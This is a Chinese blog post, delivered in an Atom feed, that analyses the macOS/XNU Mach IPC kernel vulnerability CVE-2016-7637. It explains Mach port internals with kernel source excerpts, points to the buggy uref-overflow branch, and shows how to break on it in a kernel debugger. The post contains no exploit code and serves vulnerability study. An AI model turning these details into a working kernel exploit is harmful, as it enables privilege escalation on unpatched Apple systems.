<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title><![CDATA[mrh的学习分享]]></title>
  <subtitle><![CDATA[胸口写一个勇字]]></subtitle>
  <link href="/atom.xml" rel="self"/>
  <link href="http://turingh.github.io/"/>
  <updated>2017-01-10T19:49:36.000Z</updated>
  <id>http://turingh.github.io/</id>
  
  <author>
    <name><![CDATA[mrh]]></name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title><![CDATA[CVE-2016-7637---再谈Mach IPC]]></title>
    <link href="http://turingh.github.io/2017/01/10/CVE-2016-7637-%E5%86%8D%E8%B0%88Mach-IPC/"/>
    <id>http://turingh.github.io/2017/01/10/CVE-2016-7637-再谈Mach-IPC/</id>
    <published>2017-01-10T15:26:15.000Z</published>
    <updated>2017-01-10T19:49:36.000Z</updated>
    <content type="html"><![CDATA[<blockquote>
<p>为学大病在好名。</p>
</blockquote>
<h1 id="0x00_摘要">0x00 摘要</h1><p>​    去年在分析<a href="http://turingh.github.io/2016/07/05/%E5%86%8D%E7%9C%8BCVE-2016-1757%E6%B5%85%E6%9E%90mach%20message%E7%9A%84%E4%BD%BF%E7%94%A8/">CVE-2016-1757</a>时，初步的接触了<code>Mach</code>在<code>IPC</code>系统中使用的<code>Message</code>，在分析最近的一系列与<code>IPC</code>模块相关的漏洞时，又加强对<code>IPC</code>模块的理解，所以通过一到两篇文章梳理一下最近的学习总结与心得体会。</p>
<p>​    关于<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-7637" target="_blank" rel="external">CVE-2016-7637</a>这个漏洞的描述有很多资料了，是一个攻击<code>Mach</code>的内核<code>IPC</code>模块的漏洞，本文最后会对漏洞做出比较详细的解释，这里给出几个链接，不熟悉这个漏洞的读者可以先了解一下。</p>
<p>​    <a href="https://jaq.alibaba.com/community/art/show?articleid=687" target="_blank" rel="external">黑云压城城欲摧 - 2016年iOS公开可利用漏洞总结</a></p>
<p>​    <a href="http://blog.pangu.io/mach-portal-details/" target="_blank" rel="external">mach portal漏洞利用的一些细节</a></p>
<p>​    <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=959&amp;can=1&amp;q=apple&amp;sort=-id" target="_blank" rel="external">Broken kernel mach port name uref</a></p>
<a id="more"></a>
<h1 id="0x01_什么是Port">0x01 什么是Port</h1><p>​    对于一般的开发者，在用到<code>Port</code>的时候可以简单的将<code>Port</code>理解为进程间通信所使用的类似于<code>Socket</code>的东西，可以用他来发送消息，也可以用来接收消息。</p>
<p>​    下面我们来一步一步的构建对整个模块的理解。</p>
<p>​    已经知道<code>Port</code>是什么的读者可以跳过这一个部分。</p>
<h2 id="1-1_利用Port传递数据">1.1 利用Port传递数据</h2><p>​    <code>Port</code>最简单的可以理解为一个内核中的消息队列。不同的<code>Task</code>通过这个消息队列相互传递数据。而<code>Port</code>就是用于找到这个队列的索引。</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/CVE-2016-7637-%E5%86%8D%E8%B0%88Mach-IPC/%E5%88%A9%E7%94%A8Port%E4%BC%A0%E9%80%92%E6%95%B0%E6%8D%AE.png" alt="利用Port传递数据"></p>
<h2 id="1-2_Port、Port_Name_与_Right">1.2 Port、Port Name 与 Right</h2><p>通过函数<code>mach_port_allocate</code>就可以在内核中建立一个消息队列，并获取一个与之对应的的<code>Port</code>。代码如下。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mach_port_t</span> p;</span><br><span class="line">mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &amp;p);</span><br></pre></td></tr></table></figure>
<p>通过查看内核源码，</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span><br><span class="line"> *	Purpose:</span><br><span class="line"> *		Allocates a right in a space.  Like mach_port_allocate_name,</span><br><span class="line"> *		except that the implementation picks a name for the right.</span><br><span class="line"> *		The name may be any legal name in the space that doesn't</span><br><span class="line"> *		currently denote a right.</span><br><span class="line"> */</span></span><br><span class="line"><span class="keyword">kern_return_t</span></span><br><span class="line">mach_port_allocate(</span><br><span class="line">	<span class="keyword">ipc_space_t</span>		space,</span><br><span class="line">	<span class="keyword">mach_port_right_t</span>	right,</span><br><span class="line">	<span class="keyword">mach_port_name_t</span>	*namep)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">kern_return_t</span>		kr;</span><br><span class="line">	<span class="keyword">mach_port_qos_t</span>		qos = qos_template;</span><br><span class="line"></span><br><span class="line">	kr = mach_port_allocate_full (space, right, MACH_PORT_NULL,</span><br><span class="line">					&amp;qos, namep);</span><br><span class="line">	<span class="keyword">return</span> (kr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>仔细看的话会发现，对我们刚刚申请的<code>p</code>出现了好几个解释，一下就晕了。</p>
<ul>
<li>在应用层代码中，p被定义为<code>mach_port_t</code>。</li>
<li>在内核中代码中，<code>namep</code>是<code>mach_port_name_t</code>。</li>
<li>在注释中又说，Allocates a <font color="Crimson">RIGHT</font>  in a space。</li>
</ul>
<h3 id="1-2-1_Port与Port_Name">1.2.1 Port与Port Name</h3><p>通过调试器观察一下，可以发现，</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lldb) p p&#10;(mach_port_t) $0 = 3331</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* frame <span class="preprocessor">#<span class="number">0</span>: <span class="number">0xffffff801d4ee11d</span> kernel`mach_port_allocate_full(space=<span class="number">0xffffff8024ceac00</span>, right=<span class="number">1</span>, proto=<span class="number">0x0000000000000000</span>, qosp=<span class="number">0xffffff887d7b3ef0</span>, namep=<span class="number">0xffffff887d7b3eec</span></span></span><br></pre></td></tr></table></figure>
<p>在应用层的<code>mach_port_t</code>是一个已经经过代码处理的类似于<code>Socket</code>的一个整数，来表示这个<code>Port</code>。</p>
<p>而<code>namep</code>在内核之中是一个地址，指向了一块用来索引<code>Port</code>的内存，具体的实现在本文的后面会有更详细的解释。</p>
<h3 id="1-2-2_Right">1.2.2 Right</h3><p>这里注释所说的<code>Right</code>简单的理解，其实是一个<code>Port</code>和对这个<code>Port</code>进行访问的权限。每一个<code>Port</code>代表的消息队列并不是可以任意访问的，需要有对这个队列的访问权限。各种权限在头文件中的定义如下。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">define</span> MACH_PORT_RIGHT_SEND      ((mach_port_right_t) <span class="number">0</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> MACH_PORT_RIGHT_RECEIVE   ((mach_port_right_t) <span class="number">1</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> MACH_PORT_RIGHT_SEND_ONCE ((mach_port_right_t) <span class="number">2</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> MACH_PORT_RIGHT_PORT_SET  ((mach_port_right_t) <span class="number">3</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> MACH_PORT_RIGHT_DEAD_NAME ((mach_port_right_t) <span class="number">4</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> MACH_PORT_RIGHT_NUMBER    ((mach_port_right_t) <span class="number">5</span>)</span></span><br></pre></td></tr></table></figure>
<p>每种<code>Right</code>都有不同的含义，可以自行查阅文档。</p>
<p>这里需要简单的提一下的就是每一个<code>Port</code>都有且只有<code>Task</code>对其拥有<code>RECEIVE</code>的权限，<code>SEND</code>的权限不限。拥有<code>MACH_PORT_RIGHT_RECEIVE</code>时也可以对<code>Port</code>进行消息的Send。</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/CVE-2016-7637-%E5%86%8D%E8%B0%88Mach-IPC/PORT_NAME_RIGHT.png" alt="PORT_NAME_RIGHT"></p>
<h2 id="1-3_Port的具体实现">1.3 Port的具体实现</h2><p>阅读<code>mach_port_allocate_full</code>函数的源码，最终在一个<code>port</code>的创建流程中，最主要的函数是<code>ipc_port_alloc</code>以及在其实现中调用的<code>ipc_object_alloc</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">kern_return_t</span></span><br><span class="line">ipc_port_alloc(</span><br><span class="line">	<span class="keyword">ipc_space_t</span>		space,</span><br><span class="line">	<span class="keyword">mach_port_name_t</span>	*namep,</span><br><span class="line">	<span class="keyword">ipc_port_t</span>		*portp)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">ipc_port_t</span> port;</span><br><span class="line">	<span class="keyword">mach_port_name_t</span> name;</span><br><span class="line">	<span class="keyword">kern_return_t</span> kr;</span><br><span class="line">	    </span><br><span class="line">	kr = ipc_object_alloc(space, IOT_PORT,</span><br><span class="line">			      MACH_PORT_TYPE_RECEIVE, <span class="number">0</span>,</span><br><span class="line">			      &amp;name, (<span class="keyword">ipc_object_t</span> *) &amp;port);</span><br><span class="line">	<span class="keyword">if</span> (kr != KERN_SUCCESS)</span><br><span class="line">		<span class="keyword">return</span> kr;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* port and space are locked */</span></span><br><span class="line">	ipc_port_init(port, space, name);</span><br><span class="line">	[...]</span><br><span class="line">  </span><br><span class="line">	*namep = name; &lt;--namep是从这里来的。</span><br><span class="line">	*portp = port;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> KERN_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>很明显，<code>port</code>和<code>name</code>两个变量都是由函数<code>ipc_object_alloc</code>中获取的。关键源码如下。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">kern_return_t</span></span><br><span class="line">ipc_object_alloc(</span><br><span class="line">	<span class="keyword">ipc_space_t</span>		space, </span><br><span class="line">	<span class="keyword">ipc_object_type_t</span>	otype,</span><br><span class="line">	<span class="keyword">mach_port_type_t</span>	type,</span><br><span class="line">	<span class="keyword">mach_port_urefs_t</span>	urefs,</span><br><span class="line">	<span class="keyword">mach_port_name_t</span>	*namep,</span><br><span class="line">	<span class="keyword">ipc_object_t</span>		*objectp)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">ipc_object_t</span> object;</span><br><span class="line">	<span class="keyword">ipc_entry_t</span> entry;</span><br><span class="line">	<span class="keyword">kern_return_t</span> kr;</span><br><span class="line"></span><br><span class="line">	[...]</span><br><span class="line">  </span><br><span class="line">    <span class="comment">//从zone中申请内存,这个object就是ipc_port</span></span><br><span class="line">	object = io_alloc(otype);	</span><br><span class="line">  </span><br><span class="line">    [...]</span><br><span class="line">  	</span><br><span class="line">  	<span class="comment">//获取namep和entry</span></span><br><span class="line">	*namep = CAST_MACH_PORT_TO_NAME(object);</span><br><span class="line">	kr = ipc_entry_alloc(space, namep, &amp;entry);</span><br><span class="line">	<span class="keyword">if</span> (kr != KERN_SUCCESS) &#123;</span><br><span class="line">		io_free(otype, object);</span><br><span class="line">		<span class="keyword">return</span> kr;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/* space is write-locked */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//设置关键的参数</span></span><br><span class="line">	entry-&gt;ie_bits |= type | urefs;</span><br><span class="line">	entry-&gt;ie_object = object;</span><br><span class="line">	ipc_entry_modified(space, *namep, entry);</span><br><span class="line"></span><br><span class="line">	io_lock(object);</span><br><span class="line"></span><br><span class="line">	object-&gt;io_references = <span class="number">1</span>; <span class="comment">/* for entry, not caller */</span></span><br><span class="line">	object-&gt;io_bits = io_makebits(TRUE, otype, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	*objectp = object;</span><br><span class="line">	<span class="keyword">return</span> KERN_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="1-3-1_IPC_Space和IPC_Entry">1.3.1 IPC Space和IPC Entry</h3><p>​    细心的读者会发现前面有个叫做<code>space</code>的参数没有解释。这里又出现了一个新的结构叫做<code>entry</code>。他们是有关系的，这里我们来一起解释一下。</p>
<blockquote>
<p>Each task has a private IPC <em>space</em>a namespace for portsthat is represented by the ipc_space structure in the kernel.</p>
<p>Mac OS X Internals</p>
</blockquote>
<p>每一个<code>Task</code>都有一个自己独立的<code>IPC</code>的数据空间，就是这里的<code>space</code>。他的数据结构是定义如下。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// osfmk/ipc/ipc_space.h</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">natural_t</span> <span class="keyword">ipc_space_refs_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> ipc_space &#123;</span><br><span class="line">    decl_mutex_data(,is_ref_lock_data)</span><br><span class="line">    <span class="keyword">ipc_space_refs_t</span> is_references;</span><br><span class="line"></span><br><span class="line">    decl_mutex_data(,is_lock_data)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// is the space active?</span></span><br><span class="line">    <span class="keyword">boolean_t</span> is_active;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// is the space growing?</span></span><br><span class="line">    <span class="keyword">boolean_t</span> is_growing;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// table (array) of IPC entries</span></span><br><span class="line">    <span class="comment">// 这个是最重要的，存放了所有的entry</span></span><br><span class="line">    <span class="keyword">ipc_entry_t</span> is_table; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// current table size</span></span><br><span class="line">    <span class="keyword">ipc_entry_num_t</span> is_table_size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// information for larger table</span></span><br><span class="line">    <span class="keyword">struct</span> ipc_table_size *is_table_next;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// splay tree of IPC entries (can be NULL)</span></span><br><span class="line">    <span class="keyword">struct</span> ipc_splay_tree is_tree;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// number of entries in the tree</span></span><br><span class="line">    <span class="keyword">ipc_entry_num_t</span> is_tree_total;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// number of "small" entries in the tree</span></span><br><span class="line">    <span class="keyword">ipc_entry_num_t</span> is_tree_small;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// number of hashed entries in the tree</span></span><br><span class="line">    <span class="keyword">ipc_entry_num_t</span> is_tree_hash;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// for is_fast_space()</span></span><br><span class="line">    <span class="keyword">boolean_t</span> is_fast;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>而我们研究的对象 <code>Mach Ports</code>全都存储在<code>is_table</code>这个数组中，这个数组就是由<code>ipc_entry</code>组成的。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> ipc_entry &#123;</span><br><span class="line">	<span class="keyword">struct</span> ipc_object *ie_object; 	<span class="comment">//ipc_port_t</span></span><br><span class="line">	<span class="keyword">ipc_entry_bits_t</span> ie_bits;		<span class="comment">//gen|0|0|0|capability|user reference</span></span><br><span class="line">	<span class="keyword">mach_port_index_t</span> ie_index;</span><br><span class="line">	<span class="keyword">union</span> &#123;</span><br><span class="line">		<span class="keyword">mach_port_index_t</span> next;		<span class="comment">/* next in freelist, or...  */</span></span><br><span class="line">		<span class="keyword">ipc_table_index_t</span> request;	<span class="comment">/* dead name request notify */</span></span><br><span class="line">	&#125; index;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>用一张书上的图，很清楚的表明了他们之间的关系。</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/CVE-2016-7637-%E5%86%8D%E8%B0%88Mach-IPC/space%E5%92%8Centry.png" alt=""></p>
<h3 id="1-3-2_ipc_port">1.3.2 ipc_port</h3><p>相对而言ipc_port的数据结构就较为简单了。在复制给<code>space</code>的<code>ie_object</code>之后，通过<code>ipc_port_init</code>函数的初始化，就完成了<code>port</code>的创建了。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">ipc_port_init(</span><br><span class="line">	<span class="keyword">ipc_port_t</span>		port,</span><br><span class="line">	<span class="keyword">ipc_space_t</span>		space,</span><br><span class="line">	<span class="keyword">mach_port_name_t</span>	name)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/* port-&gt;ip_kobject doesn't have to be initialized */</span></span><br><span class="line"></span><br><span class="line">	port-&gt;ip_receiver = space;</span><br><span class="line">	port-&gt;ip_receiver_name = name;</span><br><span class="line"></span><br><span class="line">	port-&gt;ip_mscount = <span class="number">0</span>;</span><br><span class="line">	port-&gt;ip_srights = <span class="number">0</span>;</span><br><span class="line">	port-&gt;ip_sorights = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	port-&gt;ip_nsrequest = IP_NULL;</span><br><span class="line">	port-&gt;ip_pdrequest = IP_NULL;</span><br><span class="line">	port-&gt;ip_requests = IPR_NULL;</span><br><span class="line"></span><br><span class="line">	port-&gt;ip_premsg = IKM_NULL;</span><br><span class="line">	port-&gt;ip_context = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	port-&gt;ip_sprequests  = <span class="number">0</span>;</span><br><span class="line">	port-&gt;ip_spimportant = <span class="number">0</span>;</span><br><span class="line">	port-&gt;ip_impdonation = <span class="number">0</span>;</span><br><span class="line">	port-&gt;ip_tempowner   = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	port-&gt;ip_guarded      = <span class="number">0</span>;</span><br><span class="line">	port-&gt;ip_strict_guard = <span class="number">0</span>;</span><br><span class="line">	port-&gt;ip_impcount    = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	port-&gt;ip_reserved    = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	ipc_mqueue_init(&amp;port-&gt;ip_messages,</span><br><span class="line">			FALSE <span class="comment">/* !set */</span>, <span class="literal">NULL</span> <span class="comment">/* no reserved link */</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里同样的用书上的一张图就可以很简单的解释清楚了。</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/CVE-2016-7637-%E5%86%8D%E8%B0%88Mach-IPC/ipc_port.png" alt="ipc_port"></p>
<h1 id="0x02_POC的分析">0x02 POC的分析</h1><p>​    POC原来的writeup在<a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=959&amp;can=1&amp;q=apple&amp;sort=-id" target="_blank" rel="external">这里</a>。</p>
<p>​    原文已经解释的非常清楚了，我就不画蛇添足了。简单记录一下我自己在分析的过程中的一些问题。</p>
<h2 id="2-1_port的user_reference计数代表了什么？">2.1 port的user reference计数代表了什么？</h2><p>​    一个<code>port</code>的<code>user reference</code>只表示了某个<code>entry</code>在<code>task</code>的<code>space</code>中被多少个地方使用，和<code>entry</code>实际指向哪个<code>port</code>没有关系。</p>
<p>​    </p>
<h2 id="2-2_ipc_right_dealloc函数是只释放了entry还是同时也在内存中释放了port？">2.2 ipc_right_dealloc函数是只释放了entry还是同时也在内存中释放了port？</h2><p>​    <code>ipc_right_dealloc</code>函数相关部分源码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">kern_return_t</span></span><br><span class="line">ipc_right_dealloc(</span><br><span class="line">	<span class="keyword">ipc_space_t</span>		space,</span><br><span class="line">	<span class="keyword">mach_port_name_t</span>	name,</span><br><span class="line">	<span class="keyword">ipc_entry_t</span>		entry)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">ipc_port_t</span> port = IP_NULL;</span><br><span class="line">	<span class="keyword">ipc_entry_bits_t</span> bits;</span><br><span class="line">	<span class="keyword">mach_port_type_t</span> type;</span><br><span class="line"></span><br><span class="line">	bits = entry-&gt;ie_bits;</span><br><span class="line">	type = IE_BITS_TYPE(bits);</span><br><span class="line"></span><br><span class="line">	assert(is_active(space));</span><br><span class="line">	<span class="keyword">switch</span> (type) &#123;</span><br><span class="line">         [...]</span><br><span class="line">	    <span class="keyword">case</span> MACH_PORT_TYPE_SEND: &#123;</span><br><span class="line">		[...]</span><br><span class="line">		port = (<span class="keyword">ipc_port_t</span>) entry-&gt;ie_object;</span><br><span class="line">		[...]</span><br><span class="line">         <span class="comment">//如果在task内entry的reference已经为1了就</span></span><br><span class="line">         <span class="comment">//释放entry</span></span><br><span class="line">         <span class="comment">//如果计数不为1，就将计数减一</span></span><br><span class="line">		<span class="keyword">if</span> (IE_BITS_UREFS(bits) == <span class="number">1</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span> (--port-&gt;ip_srights == <span class="number">0</span>) &#123;</span><br><span class="line">				nsrequest = port-&gt;ip_nsrequest;</span><br><span class="line">				<span class="keyword">if</span> (nsrequest != IP_NULL) &#123;</span><br><span class="line">					port-&gt;ip_nsrequest = IP_NULL;</span><br><span class="line">					mscount = port-&gt;ip_mscount;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			[...]</span><br><span class="line">			entry-&gt;ie_object = IO_NULL;</span><br><span class="line">			ipc_entry_dealloc(space, name, entry);</span><br><span class="line">			is_write_unlock(space);</span><br><span class="line">			ip_release(port);</span><br><span class="line"></span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			ip_unlock(port);			</span><br><span class="line">			entry-&gt;ie_bits = bits-<span class="number">1</span>; <span class="comment">/* decrement urefs */</span></span><br><span class="line">			ipc_entry_modified(space, name, entry);</span><br><span class="line">			is_write_unlock(space);</span><br><span class="line">		&#125;</span><br><span class="line">	[...]</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> KERN_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>所以当<code>entry</code>计数为1的时候，调用了<code>ipc_entry_dealloc</code>，<code>ipc_entry_dealloc</code>不会将<code>entry</code>对应的内存释放，而是将其放入一个<code>free_list</code>等待重复使用。<code>entry</code>的内存不会释放，而且<code>entry</code>在<code>is_table</code>中的<code>index</code>也并不会改变，只是被放到了一个结构管理的队列中去了。</p>
<p>对于<code>Port</code>来说，内核调用了<code>ip_release</code>，这个函数的作用是减少<code>ipc_object</code>自身的<code>reference</code>，如果<code>port</code>的索引变为0了，那就会被释放，如果系统中还有其他的进程在使用这个<code>port</code>，那么这个<code>port</code>就不会被释放。</p>
<h2 id="2-3_如何通过调试器调试漏洞触发的现场?">2.3 如何通过调试器调试漏洞触发的现场?</h2><p>一开始我想的方法是对<code>ipc_right_copyout</code>下条件断点，条件是<code>entry-&gt;ie_bits&amp;0xffff == 0xfffe</code>。但是因为<code>ipc_right_copyout</code>这个函数在内核中的调用太过于频繁，导致虚拟机跑太卡了。</p>
<p>只能通过逆向，在汇编代码处下断点。（内核版本10.12_16A323）</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/CVE-2016-7637-%E5%86%8D%E8%B0%88Mach-IPC/bug%E7%82%B9.png" alt=""></p>
<p>对应的就是出bug的代码段。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (urefs+<span class="number">1</span> == MACH_PORT_UREFS_MAX) &#123;</span><br><span class="line">     <span class="keyword">if</span> (overflow) &#123;</span><br><span class="line">         <span class="comment">/* leave urefs pegged to maximum */</span>     &lt;---- (<span class="number">1</span>)</span><br><span class="line">         </span><br><span class="line">         port-&gt;ip_srights--;</span><br><span class="line">         ip_unlock(port);</span><br><span class="line">         ip_release(port);</span><br><span class="line">         <span class="keyword">return</span> KERN_SUCCESS;</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     ip_unlock(port);</span><br><span class="line">     <span class="keyword">return</span> KERN_UREFS_OVERFLOW;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>所以通过断点</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b *(0xffffff80002e6fbb + kslide)</span><br></pre></td></tr></table></figure>
